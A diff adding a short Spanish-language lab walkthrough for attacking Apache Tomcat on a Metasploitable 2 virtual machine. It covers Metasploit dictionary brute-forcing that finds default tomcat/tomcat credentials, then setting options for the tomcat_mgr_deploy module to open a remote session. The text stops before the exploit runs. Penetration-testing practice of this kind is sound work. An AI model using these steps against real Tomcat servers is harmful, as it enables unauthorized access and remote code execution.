@@ -1,0 +1,10 @@
+Empezamos haciendo un search tomcat. Usaremos el exploit que usara diccionarios para intentar encontrar el login que tiene tomcat. Cambiaremos el rhosts y el rport ya que en la maquina de metasploitable 2 esta utilizando el puerto 8180 . Ya viene configurado con los diccionarios por defecto, que en este caso lo dejaremos así ya que tiene una lista de contraseñas por defecto para tomcat. Lo ejecutamos y encuentra usuario y contraseña tomcat tomcat. Ahora utilizaremos un modulo que se aprovechara de estas credenciales para crear una sesion remota. Utilizaremos el modulo 6 exploit/multi/http/tomcat_mgr_deploy . Que es para utilizar el deployer con unas credenciales validas. Completaremos el password y user y tambien puerto e rhosts
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set rhosts 10.0.2.11
+rhosts => 10.0.2.11
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set rport 8180
+rport => 8180
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set httpPassword tomcat
+httpPassword => tomcat
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set httpUsername tomcat
+httpUsername => tomcat
+
